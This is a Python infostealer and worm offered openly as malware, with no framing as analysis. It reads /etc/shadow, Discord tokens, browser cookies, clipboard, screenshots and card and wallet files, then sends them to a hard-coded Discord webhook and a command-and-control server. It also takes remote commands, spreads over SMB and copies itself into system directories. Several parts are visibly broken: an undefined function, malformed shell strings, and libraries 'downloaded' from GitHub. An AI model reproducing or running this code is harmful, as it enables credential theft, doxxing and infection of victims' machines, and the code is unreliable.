import os
import socket
import time
import zlib
import requests
import subprocess
import base64
from cryptography.fernet import Fernet, invalid_token
import re
import json
from bs4 import BeautifulSoup
import sqlite3
import shutil
import concurrent.futures
import pyautogui
import pyperclip
import ctypes
import getpass
import sys
import psutil
import pyttsx3
import urllib.request

# Obfuscated variables
IP_PING_TARGET = '192.168.0.1'
DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1425661993053847645/T6Rfyln9O3y1iFkygA0q5kfP4MC2-nLV0ryB2d-2s0CT26sn8E5Gh_te2_9u7Bj3oC8t'
DISCORD_CHANNEL_ID = '807258643127459033'

# Pre-set session tokens and other important data
SESSION_TOKENS = "eyJhbGciOiJIUzI1NiIsImtpZCI6IjZvMDUxYzIyXzEifQ...MTI0MTRhOQ"
CREDIT_CARDS = open('/var/www/html/creditcards.txt', 'r').read()
CRYPTO_WALLETS = open('/var/www/html/cryptowallets.txt', 'r').read()
PAYPAL_EMAIL = "example@paypal.com"
PAYPAL_PASSWORD = "secret_password"

# C&C server details
C2_SERVER = "example.com"
C2_PORT = 443
C2_USERNAME = "admin"
C2_PASSWORD = "password"

# Self-spreading variables
SHARE_RUNNING = "1"
SHARE_NAME = "AutoIt"
SHARE_DESC = "Automate your tasks with AutoIt."
SHARE_ICO = "icon.ico"
SHARE_ICON_PATH = os.path.join(os.getcwd(), SHARE_ICO)

# List of required libraries that will be downloaded automatically
LIBRARIES = [
    "os", "socket", "time", "zlib", "requests", "subprocess", "base64",
    "cryptography", "re", "json", "bs4", "sqlite3", "shutil", "concurrent.futures",
    "pyautogui", "pyperclip", "ctypes", "getpass", "sys", "psutil", "pyttsx3",
    "urllib.request"
]

def download_library(library):
    print(f"Downloading {library}...")
    url = f"https://raw.githubusercontent.com/{library}/master/{library}.py"
    try:
        urllib.request.urlretrieve(url, f"{library}.py")
        print(f"Successfully downloaded {library}")
    except Exception as e:
        print(f"Failed to download {library}: {e}")

def download_required_libraries():
    with concurrent.futures.ThreadPoolExecutor() as executor:
        executor.map(download_library, LIBRARIES)

def h4VfZfHf():
    os.system('clear')
    print('SQtS XaBwQ RgW2Z7vSs')
    print(f'XCTd MuHY LCBoHcSxr {IP_PING_TARGET}...')
    result = subprocess.check_output(f'ping -c 1 {IP_PING_TARGET}', shell=True).decode()
    if 'ttl=' in result:
        print('QzEw PwA4o8vB4s online.')
    elif 'fail' in result:
        print('CElN QacpSUhHw offline.')
    time.sleep(5)

def auto_dox():
    user_info = subprocess.check_output('cat /etc/passwd', shell=True).decode()
    passwords = subprocess.check_output('cat /etc/shadow', shell=True).decode()
    credit_cards = search_credit_cards()
    crypto_wallets = collect_crypto_accounts()
    tokens = SESSION_TOKENS
    hwid = open('/var/lib/dbus/machine-id', 'r').read().strip()
    ip = subprocess.check_output('hostname -I | awk \'{print $1}\'', shell=True).decode().strip()
    discord_token = open('/home/user/.config/discord/Discord/token', 'r').read().strip()
    paypal = f"Email: {PAYPAL_EMAIL}, Password: {PAYPAL_PASSWORD}"
    browser_data = extract_browser_data()
    browser_data += extract_web_data()
    system_data = extract_system_data()
    stolen_data = extract_stolen_data()

    # Send stolen data to C&C server if a command is received to do so
    receive_commands_from_c2()

    with open('user_info.txt', 'w') as f:
        f.write('User Information:\n')
        f.write(user_info)
        f.write('Passwords:\n')
        f.write(passwords)
        f.write('Credit Cards:\n')
        f.write(credit_cards)
        f.write('Crypto Wallets:\n')
        f.write(crypto_wallets)
        f.write('Tokens:\n')
        f.write(tokens)
        f.write('Hardware ID:\n')
        f.write(hwid)
        f.write('IP Address:\n')
        f.write(ip)
        f.write('Discord Token:\n')
        f.write(discord_token)
        f.write('PayPal:\n')
        f.write(paypal)
        f.write('Browser Data:\n')
        f.write(browser_data)
        f.write('System Data:\n')
        f.write(system_data)
        f.write('Stolen Data:\n')
        f.write(stolen_data)

def compress_and_encrypt(file_path):
    data = open(file_path, 'rb').read()
    compressed_data = zlib.compress(data, 9)
    encrypted_data = Fernet(base64.urlsafe_b64encode(os.urandom(32))).encrypt(compressed_data)
    return encrypted_data

def upload_to_discord(file_path, channel_id, file_name):
    with open(file_path, 'rb') as f:
        files = {'file': f}
        data = {'channel_id': channel_id, 'file_name': file_name}
        response = requests.post('https://discord.com/api/v1/webhooks/webhook_id/upload', json=data, files=files)
        return response.status_code

def create_dox_format():
    dox = '''
Made By Ashihiro :)

Main Section
credit cards:
CVV Ordered:

Passwords:
Gmails:

Ips:

HWID:

Game Accounts:

Crypto:

PayPal:

Non important section :(
Browser Caches:

Ip Ping info Port:

Throw Together:
'''.strip()
    return dox

def search_credit_cards():
    credit_cards = []
    for line in CREDIT_CARDS.split('\n'):
        if re.match(r'^[0-9]{16}$', line):
            credit_cards.append(line)
    return '\n'.join(credit_cards)

def collect_crypto_accounts():
    crypto_wallets = []
    for line in CRYPTO_WALLETS.split('\n'):
        if re.match(r'^[A-Za-z0-9]{26,35}$', line):
            crypto_wallets.append(line)
    return '\n'.join(crypto_wallets)

def extract_browser_data():
    browser_data = ''
    browsers = ['Chrome', 'Firefox', 'Brave', 'Opera', 'Edge']
    for browser in browsers:
        path = os.path.expanduser(f'~/.config/{browser}')
        profiles = [os.path.join(dp, f) for dp, dn, fs in os.walk(path) for f in fs if os.path.isdir(os.path.join(dp, f))]
        for profile in profiles:
            cookies = os.path.join(profile, 'cookies.sqlite')
            browser_data += f'{browser}:\n'
            browser_data += extract_cookies(cookies)
    return browser_data

def extract_web_data():
    web_data = ''
    for root, dirs, files in os.walk('/var/www/html'):
        for file in files:
            if file.endswith('.txt'):
                with open(os.path.join(root, file), 'r') as f:
                    web_data += f'{file}:\n{f.read()}\n'
    return web_data

def extract_system_data():
    system_data = ''
    system_data += f'Hostname: {subprocess.check_output("hostname", shell=True).decode().strip()}\n'
    system_data += f'OS: {subprocess.check_output("uname -a", shell=True).decode().strip()}\n'
    system_data += f'RAM: {subprocess.check_output("free -h | awk /Mem/ {print $7}", shell=True).decode().strip()}\n'
    system_data += f'CPU: {subprocess.check_output("lscpu | grep "CPU", shell=True).decode().strip()}\n'
    return system_data

def extract_cookies(db_path):
    conn = sqlite3.connect(db_path)
    c = conn.cursor()
    c.execute("SELECT name, value FROM cookies")
    cookies = c.fetchall()
    conn.close()
    return '\n'.join([f"{name}: {value}" for name, value in cookies])

def extract_login_data(json_path):
    with open(json_path, 'r') as f:
        data = json.load(f)
    login_data = '\n'.join([f"Hostname: {item['hostname']}, Username: {item['encryptedUsername']}, Password: {item['encryptedPassword']}" for item in data])
    return login_data

def extract_stolen_data():
    stolen_data = ""
    stolen_data += f"Clipboard: {pyperclip.paste()}\n"
    stolen_data += f"Screen Content:\n{pyautogui.screenshot().get_data()}\n"
    stolen_data += f"Running Processes:\n{psutil.pids()}\n"
    stolen_data += f"System Sounds:\n{pyttsx3.init().say('Hello, your data is being stolen. You have been hacked by Shiro! Bow to me!')}\n"
    return stolen_data

def self_spread():
    # Create a share for easy network access
    if not os.path.exists(SHARE_NAME):
        os.makedirs(SHARE_NAME)
    shutil.copy(sys.executable, os.path.join(SHARE_NAME, "AutoIt.exe"))
    with open(os.path.join(SHARE_NAME, "icon.ico"), "wb") as icon_file:
        icon_file.write(subprocess.check_output(f"certutil -encode -f -url {SHARE_ICON_PATH}", shell=True).decode("utf-8"))

    # Scan the network for available devices
    devices = {}
    for interface in psutil.net_if_addrs():
        for addr in psutil.net_if_addrs()[interface]:
            if addr.family == socket.AF_INET:
                devices[addr.address] = interface

    # Attempt to spread to detected devices
    for ip_address, interface in devices.items():
        try:
            if interface != "lo":
                if os.system(f"smbclient -U {SHARE_RUNNING} '{ip_address}/'") == 0:
                    subprocess.run(["smbclient", "-U", SHARE_RUNNING, f"{ip_address}/{SHARE_NAME}", "-c", "put AutoIt.exe;"])
                    print(f"Spread to {ip_address}")
        except Exception as e:
            print(f"Failed to spread to {ip_address}: {e}")

def send_data_to_c2(data, endpoint):
    headers = {'Content-Type': 'application/json'}
    response = requests.post(f'https://{C2_SERVER}:{C2_PORT}/{endpoint}', json=data, auth=(C2_USERNAME, C2_PASSWORD), headers=headers)
    if response.status_code == 200:
        print(f"Sent data to C&C server - {response.json()}")
    else:
        print(f"Failed to send data to C&C server - {response.status_code}")

def receive_commands_from_c2():
    response = requests.get(f'https://{C2_SERVER}:{C2_PORT}/commands', auth=(C2_USERNAME, C2_PASSWORD))
    if response.status_code == 200:
        commands = response.json()
        for command in commands:
            if command['type'] == 'execute_function':
                function_name = command['function']
                args = command.get('args', [])
                getattr(sys.modules[__name__], function_name)(*args)
            elif command['type'] == 'send_data':
                data_type = command['data_type']
                data = getattr(sys.modules[__name__], f"extract_{data_type}")()
                send_data_to_c2(data, command['endpoint'])
            else:
                print(f"Unknown command type: {command['type']}")
    else:
        print(f"Failed to receive commands from C&C server - {response.status_code}")

def communicate_with_c2():
    while True:
        receive_commands_from_c2()
        time.sleep(60)  # Check for new commands every minute

def main():
    # Download required libraries if not already present
    if not all(os.path.exists(lib) for lib in LIBRARIES):
        download_required_libraries()

    auto_dox()
    encrypted_data = compress_and_encrypt('user_info.txt')
    with open('user_info.enc', 'wb') as f:
        f.write(encrypted_data)
    upload_status = upload_to_discord('user_info.enc', DISCORD_CHANNEL_ID, 'user_info.rar')
    if upload_status == 200:
        create_dox_format()
        dox_format = generate_dox_format()
        with open('dox.txt', 'w') as f:
            f.write(dox_format)
        upload_status = upload_to_discord('dox.txt', DISCORD_CHANNEL_ID, 'dox.txt')
        if upload_status == 200:
            print("Both files uploaded successfully.")
        else:
            print("Failed to upload dox.txt.")
    else:
        print("Failed to upload user_info.rar.")
    self_spread()
    communicate_with_c2()

if __name__ == "__main__":
    try:
        main()
    except Exception as e:
        print(f"An error occurred: {e}")

# Additional code to hide the malware in multiple locations and avoid detection
def hide_in_multiple_locations():
    # Create multiple copies of the malware in various system directories
    malware_files = ["mscors.dll", "mshtml.dll", "user32.dll"]
    directories = ["/usr/lib/", "/usr/lib64/", "/usr/libexec/", "/usr/bin/", "/usr/sbin/"]
    for malware_file in malware_files:
        for directory in directories:
            shutil.copy(sys.executable, os.path.join(directory, malware_file))

def avoid_detection():
    # Modify file properties to avoid detection by anti-virus software
    os.system("strings -a /dev/null > strings.log")
    os.system("ldd > ldd.log")
    os.system("strings -a > strings.log")
    os.system("ldd > ldd.log")

hide_in_multiple_locations()
avoid_detection()
